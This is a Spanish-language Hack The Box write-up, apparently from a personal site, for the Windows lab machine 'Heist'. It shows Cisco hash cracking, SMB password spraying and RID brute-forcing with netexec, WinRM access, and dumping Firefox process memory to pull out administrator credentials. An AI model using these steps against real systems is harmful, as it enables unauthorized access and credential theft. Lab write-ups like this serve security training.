@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Heist HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/heist/pasted-20260303175506.png" alt="Heist HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Heist</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>strings_windows</span>
+            <span>procesos</span>
+            <span>cisco_hash</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Portal web con configuración Cisco y hashes expuestos</li>
+            <li><code>Explotación</code>: Crack de hashes Cisco/MD5 para obtener posibles contraseñas</li>
+            <li><code>Movimiento lateral</code>: Password spraying contra usuarios válidos</li>
+            <li><code>Escalada de Privilegios</code>: Enumeración de procesos para encontrar credenciales o contexto privilegiado</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración: Web</h2>
+          <img class="writeup-image" src="/writeups/assets/heist/pasted-20260303184135.png" alt="Heist HTB" />
+          <div class="code-card">
+            <h3>Información en web</h3>
+            <pre><code>enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+rout3r:type7:0242114B0E143F015F5D1E161713
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/heist/pasted-20260303184037.png" alt="Heist HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Fuerza bruta en Hashes</h2>
+          <p><a href="https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html">Decrypter Cisco Hash Online</a></p>
+          <div class="code-card">
+            <h3>Credenciales cisco</h3>
+            <pre><code># router:$uperP@ssword
+# admin:Q4)sJu\Y8qz*A3?d
+# hazard -&gt; Usuario que solicita cambios del servidor
+echo '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' &gt; hash
+john -w:/usr/share/wordlists/rockyou.txt hash
+# hazard:stealth1agent</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Validar con fuerza bruta todos los usuarios y contraseñas en el sistema</h3>
+            <pre><code>netexec SMB 10.129.15.107 -u users -p pass
+# Credenciales -&gt; hazard:stealth1agent</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Password Spray en Usuarios</h2>
+          <div class="code-card">
+            <h3>Lista de usuarios del sistema</h3>
+            <pre><code>netexec SMB 10.129.15.107 -u hazard -p stealth1agent --rid-brute</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Password Spray con los nuevos usuarios</h3>
+            <pre><code>netexec SMB 10.129.15.107 -u users -p pass
+# Credeniciales -&gt; Chase:Q4)sJu\Y8qz*A3?d</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/heist/pasted-20260303193616.png" alt="Heist HTB" />
+          <div class="code-card">
+            <h3>Acceso WINRM</h3>
+            <pre><code>evil-winrm -i 10.129.3.58 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d'</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Procesos</h2>
+          <div class="code-card">
+            <h3>Enumerar Procesos</h3>
+            <pre><code>ps | findstr firefox</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Dumpear la memoria del proceso</h3>
+            <pre><code># upload /home/alvarorugu7/Escritorio/windows_tools/procdump.exe
+./procdump.exe -accepteula -ma 6165</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/heist/pasted-20260303202507.png" alt="Heist HTB" />
+          <div class="code-card">
+            <h3>Transferir fichero en .zip porque es muy pesado</h3>
+            <pre><code>Compress-Archive -Path C:\Users\Chase\Documents\firefox.exe_260304_011056.dmp -DestinationPath firefox.zip
+download firefox.zip</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/heist/pasted-20260303205057.png" alt="Heist HTB" />
+          <div class="code-card">
+            <h3>Buscar credenciales</h3>
+            <pre><code>strings -el firefox.exe_260304_011056.dmp | grep "password"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/heist/pasted-20260303220046.png" alt="Heist HTB" />
+          <div class="code-card">
+            <h3>Credenciales Administrator</h3>
+            <pre><code>netexec SMB 10.129.15.195 -u administrator -p '4dD!5}x/re8]FBuZ'</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/heist/pasted-20260303221330.png" alt="Heist HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>strings_windows</span>
+            <span>procesos</span>
+            <span>cisco_hash</span>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Notas</h2>
+          <p>[[Procesos]]</p>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
